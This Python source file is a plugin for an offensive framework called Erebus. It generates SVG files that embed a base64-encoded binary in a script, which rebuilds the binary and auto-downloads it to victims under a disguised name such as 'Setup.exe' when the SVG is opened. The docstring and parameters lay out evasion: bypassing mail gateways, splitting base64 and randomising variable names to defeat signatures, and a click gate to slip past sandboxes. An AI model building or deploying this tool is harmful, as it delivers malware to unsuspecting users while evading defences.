"""
Erebus Plugin - SVG Smuggling Trigger

Generates an SVG file with an embedded JavaScript payload blob that
reconstructs a binary and auto-downloads it when the SVG is opened
in a browser.

Delivery chain: email / web → victim opens .svg → browser executes
embedded <script> → Blob reconstructed → file saved to Downloads/.

Why SVG over HTML smuggling:
  - Mail gateways that strip/block .html/.htm attachments often pass .svg
    (treated as an image, not a document/script carrier)
  - SVG is rendered natively by Chrome, Edge, Firefox without a download prompt
  - The <script> tag executes in the document origin - no cross-origin restrictions
  - File size limit: same as HTML smuggling (base64 inflates ~33%)

OPSEC Notes:
  Detection Surface:
    - browser.exe spawning a file-download from a local SVG document
    - JavaScript Blob URL object creation (flagged by some CASB/proxy products)
    - Large base64 data block inside SVG body (static yara signature)
  Behavioral Indicators:
    - SVG file containing <script> tags (unusual for legitimate SVGs)
    - Auto-download on page load without user interaction
  Hardening:
    - [MALLEABLE] Split the base64 payload across multiple SVG <text> elements
      and reassemble via JS to break single-string regex signatures
    - [MALLEABLE] Add a fake user-interaction gate (click event) to defeat
      sandbox automation that doesn't simulate clicks
    - [MALLEABLE] Encrypt the payload blob with a session-derived key
      (e.g. window.navigator.userAgent hash) to bind to specific browser UA

Reference: T1027.006 - Obfuscated Files or Information: HTML Smuggling
"""

import base64
import pathlib
import random
import string
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


def _rand_id(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=n))


def _split_b64(data: str, chunk: int = 80) -> list[str]:
    """Split base64 string into chunks for inline embedding."""
    return [data[i:i + chunk] for i in range(0, len(data), chunk)]


class SvgSmugglingPlugin(ErebusPlugin):
    """SVG file smuggling trigger - binary blob auto-download via browser <script>."""

    metadata = PluginMetadata(
        name="SVG Smuggling",
        version="1.0.0",
        category=PluginCategory.TRIGGER,
        description="Generate an SVG trigger that auto-downloads a payload blob when opened in a browser",
        author="Whispergate",
    )

    def get_metadata(self) -> PluginMetadata:
        return self.metadata

    def register(self) -> Dict[str, Callable]:
        return {
            "create_svg_smuggling_trigger": self.create_svg_smuggling_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return True, None

    def on_load(self):
        pass

    # ------------------------------------------------------------------ #

    def create_svg_smuggling_trigger(
        self,
        payload_path: str,
        output_filename: str = "document.svg",
        payload_dir: Optional[pathlib.Path] = None,
        # [MALLEABLE] filename presented to the victim in the browser download bar
        download_name: str = "Setup.exe",
        # [MALLEABLE] MIME type for the Blob (application/octet-stream is safest)
        mime_type: str = "application/octet-stream",
        # Split base64 across JS string concat to break naive yara rules
        obfuscate_b64: bool = True,
        # Add a fake user-interaction gate before the auto-download fires
        require_click: bool = False,
        # SVG viewport dimensions (px) - affects how browsers render it
        width: int = 1,
        height: int = 1,
    ) -> pathlib.Path:
        """Generate an SVG file that smuggles a payload download via Blob URL.

        The SVG embeds the target payload as a base64-encoded Blob inside a
        <script> tag. When a browser opens the file, the script reconstructs
        the binary, creates a Blob URL, and auto-clicks a hidden <a> element
        to trigger a file download - identical to HTML smuggling but using an
        SVG wrapper to bypass mail gateway filters that block .html attachments.

        Args:
            payload_path:    Path to the binary payload to embed.
            output_filename: Output .svg filename (default: document.svg).
            payload_dir:     Directory to write the SVG file into.
            download_name:   Filename the victim's browser saves the download as.
            mime_type:       MIME type for the Blob object.
            obfuscate_b64:   Split base64 string across array concat to harden
                             against simple pattern-matching rules.
            require_click:   If True, wrap auto-download in a click handler rather
                             than firing immediately on load (sandbox evasion).
            width/height:    SVG canvas size - 1×1 px keeps the file invisible
                             when embedded in a larger page.

        Returns:
            pathlib.Path: Path to the created .svg file.
        """
        if payload_dir is None:
            payload_dir = pathlib.Path(".")
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        with open(payload_path, "rb") as f:
            raw = f.read()
        b64 = base64.b64encode(raw).decode("ascii")

        # Variable names - randomised per build to frustrate static signatures
        v_data   = _rand_id()
        v_bytes  = _rand_id()
        v_blob   = _rand_id()
        v_url    = _rand_id()
        v_anchor = _rand_id()

        if obfuscate_b64:
            chunks = _split_b64(b64, chunk=76)
            b64_expr = "[" + ",\n    ".join(f'"{c}"' for c in chunks) + "].join('')"
        else:
            b64_expr = f'"{b64}"'

        reconstruct_js = f"""\
var {v_data} = {b64_expr};
var {v_bytes} = Uint8Array.from(atob({v_data}), function(c) {{ return c.charCodeAt(0); }});
var {v_blob}  = new Blob([{v_bytes}], {{type: "{mime_type}"}});
var {v_url}   = URL.createObjectURL({v_blob});
var {v_anchor} = document.createElementNS("http://www.w3.org/1999/xhtml", "a");
{v_anchor}.href     = {v_url};
{v_anchor}.download = "{download_name}";
document.documentElement.appendChild({v_anchor});
{v_anchor}.click();
URL.revokeObjectURL({v_url});"""

        if require_click:
            # Fire on first user click anywhere on the SVG
            fn = _rand_id()
            script_body = f"""\
function {fn}() {{
{reconstruct_js}
  document.documentElement.removeEventListener("click", {fn});
}}
document.documentElement.addEventListener("click", {fn});"""
        else:
            script_body = reconstruct_js

        svg = f"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xhtml="http://www.w3.org/1999/xhtml"
     width="{width}" height="{height}"
     viewBox="0 0 {width} {height}">
  <foreignObject width="1" height="1">
    <xhtml:div>
      <xhtml:script type="text/javascript">
//<![CDATA[
{script_body}
//]]>
      </xhtml:script>
    </xhtml:div>
  </foreignObject>
</svg>"""

        out = payload_dir / output_filename
        out.write_text(svg, encoding="utf-8")
        return out


_plugin = SvgSmugglingPlugin()

if __name__ == "__main__":
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
